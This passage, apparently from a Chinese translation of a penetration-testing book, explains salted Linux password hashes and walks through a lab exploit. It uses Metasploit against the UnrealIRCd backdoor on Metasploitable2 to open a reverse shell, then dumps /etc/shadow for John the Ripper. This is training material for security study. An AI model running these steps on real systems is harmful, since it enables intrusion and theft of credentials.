  mdcn: "\n破解密码的工具和技术种类繁多。一位朋友问我对破解密码是什么感觉，我告诉他们：“它就像是国际象棋和开锁术的结合。”事实确实如此。每次面对新的密码转储时，感觉都略有不同。很多人倾向于使用一些相似的密码，但要获取所有密码，你通常需要进行大量的分析和策略制定。希望这里涵盖的战术和技术能让你在密码破解的道路上迈出坚实的一步！\n\
    \n## 第 8 章：破解 Linux 密码\n\n正如 Windows 中的密码哈希可以被破解一样，Linux 系统也面临着同样的风险。你只需要拥有 root\
    \ 级别的访问权限来获取哈希值，并配备一款良好的密码攻击工具即可破解它们。在本章中，我们将使用 John the Ripper 来尝试破解 Linux 密码。随后，我们将介绍其他几种可用于破解服务器应用密码并执行自动化攻击的工具。\n\
    \n在进入本章的核心内容之前，让我们先看看一些实际的 Linux 密码哈希。以下是两个 Linux 密码哈希，第一个来自 Metasploitable2，第二个是我在我的\
    \ Kali Linux 机器上创建的一个用户。\n\n1. msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/\n2.\
    \ dan:$6$miC/IqYE$eAHWWJ2S61YKukO.Amlriu4JNCru9vkcyzFndynlrJGF6QjfCjV0Sd70CSmX0Sp9xmthpr11yOR4QTSpJCYN/\n\
    \nNTLM 密码与 Linux 密码之间的主要区别在于，Linux 密码是经过加盐处理的。盐（salt）是一个唯一的字符串，用于编码每个密码，使得即使两个用户使用了完全相同的密码，其生成的密码哈希值也不同。这样，任何两个哈希值都不会相同。\n\
    \n我们在下面分解密码哈希的内容：\n\n![](img/4a03f08556c51a14a3b88fe549a54ca8_141_0.png)\n\n第\
    \ 1 部分是用户名。第 2 部分是加密类型，加密类型为 1 表示它使用的是 128 位加密。第 3 部分是该密码哈希使用的盐。最后，第 4 部分是实际的哈希值。\n\
    \n请注意，来自较新版本 Linux 的第二个哈希值的格式完全相同，但长度要长得多。该哈希值使用的是加密类型 6，这意味着它使用的是 512 位加密，因此哈希值更长。这是一种更强大的加密方式，但在破解它们时其实不需要做任何不同的事情，因为\
    \ John the Ripper 会自动检测正确的哈希算法并相应地进行破解。\n\n在破解 Windows NTLM 密码时，你会遇到许多相同的哈希值，因为用户使用了相同的密码。这是因为\
    \ Windows NTLM 哈希不使用盐。因此，如果在 Windows 中有两个或更多用户使用了完全相同的密码，其 NTLM 密码哈希值将是相同的。但在\
    \ Linux 中并非如此。如果用户使用了相同的密码，所使用的盐会为每个用户生成不同的哈希值。下面的哈希值来自在 Kali Linux 中使用了密码“password”的两个用户（Dan\
    \ 和 Alice）：\n\n![](img/4a03f08556c51a14a3b88fe549a54ca8_141_1.png)\n\n请注意，Linux\
    \ 哈希值彼此完全不同（盐值也是）。在大范围的密码哈希转储中破解密码时，由于总是有用户使用相同的密码，这会造成巨大的时间差异。如果不使用盐，你可以一次性获取所有相同的密码；如果经过加盐，你必须逐个破解每个哈希值。好了，关于哈希格式的讨论到此为止，让我们看看如何从系统中获取\
    \ Linux 密码哈希。\n\n### 获取 Linux 密码\n\nMetasploitable2 是一个故意存在漏洞的 Linux 系统。我在我的 Basic\
    \ Kali 书中对其进行了详细讲解，所以我们这里只是快速看一下漏洞利用和密码哈希恢复过程。我们将使用 Kali Linux 作为攻击系统，并使用 Metasploit\
    \ 框架来处理漏洞利用和哈希恢复。我们将使用 UnrealIRcD 后门漏洞，然后从系统中提取密码。\n\n-   启动你的 Metasploitable\
    \ 2 虚拟机\n    -   在你的 Kali 虚拟机上，运行 Metasploit\n    -   在 Metasploit 中输入：`use exploit/unix/irc/unreal_ircd_3281_backdoor`\n\
    \    -   输入：`set payload cmd/unix/reverse`\n    -   `set LHOST [Kali_IP]`\n  \
    \  -   `set RHOST [Metasploitable2_IP]`\n    -   然后，`exploit`\n\n```\nmsf6 > use\
    \ exploit/unix/irc/unreal_ircd_3281_backdoor\n[*] Using configured payload cmd/unix/reverse\n\
    msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse\n\
    payload => cmd/unix/reverse\nmsf6 exploit(unix/irc/unreal_ircd_3281_backdoor)\
    \ > set LHOST 172.24.1.188\nLHOST => 172.24.1.188\nmsf6 exploit(unix/irc/unreal_ircd_3281_backdoor)\
    \ > set RHOST 172.24.1.156\nRHOST => 172.24.1.156\nmsf6 exploit(unix/irc/unreal_ircd_3281_backdoor)\
    \ > exploit\n\n[*] Started reverse TCP double handler on 172.24.1.188:4444\n[*]\
    \ 172.24.1.156:6667 - Connected to 172.24.1.156:6667 ...\n    :irc.Metasploitable.LAN\
    \ NOTICE AUTH :** Looking up your hostname ...\n[*] 172.24.1.156:6667 - Sending\
    \ backdoor command ...\n[*] Accepted the first client connection ...\n[*] Accepted\
    \ the second client connection ...\n[*] Command: echo vUv6yqmRsIgoB2YT;\n[*] Writing\
    \ to socket A\n[*] Writing to socket B\n[*] Reading from sockets ...\n[*] Reading\
    \ from socket B\n[*] B: \"vUv6yqmRsIgoB2YT\\r\\n\"\n[*] Matching ...\n[*] A is\
    \ input ...\n[*] Command shell session 1 opened (172.24.1.188:4444 -> 172.24.1.156:41453)\
    \ at\n```\n\n这将打开一个远程 Linux 命令 shell，因此不会有提示符。只需输入你想运行的任何命令即可。你可以输入 `whoami` 来验证你确实是全能的\
    \ 'root' 用户。\n\n现在我们要准备从系统中恢复密码哈希了。\n\n-   只需输入 \"cat /etc/shadow\":\n\n```\n\
    cat /etc/shadow\nroot:$1$avpFBJ1$xo8w5UF9iV.. /DR9E9Lid.:14747:0:99999:7:::\n\
    daemon:*:14684:0:99999:7:::\nbin:*:14684:0:99999:7:::\nsys:$1$FUX68P0t$M1yc3cP0oZQJqZ4w5WF9l0:14742:0:99999:7:::\n\
    sync:*:14684:0:99999:7:::\ngames:*:14684:0:99999:7:::\nman:*:14684:0:99999:7:::\n\
    lp:*:14684:0:99999:7:::\nmail:*:14684:0:99999:7:::\nnews:*:14684:0:99999:7:::\n\
    ucu:p:*:14684:0:99999:7:::\n```\n\n-   在你的 Kali 系统上打开 Mousepad\n\n-   现在只需将哈希值复制到你的\
    \ Kali 系统，方法是用鼠标选择文本并将其复制到 Mousepad 中：\n\n![](img/4a03f08556c51a14a3b88fe549a54ca8_144_0.png)\n\
    \n-   将文本保存为名为 “shadow” 的文件，位于 Kali 主目录中\n\n既然我们已经获取了 shadow 文件，我们就可以让 John the\
    \ Ripper 发挥作用，尝试恢复密码。我们将使用 John 附带的单词列表文件 “password.lst”：\n\n-   输入 “john --wordlist=/usr/share/john/password.lst\
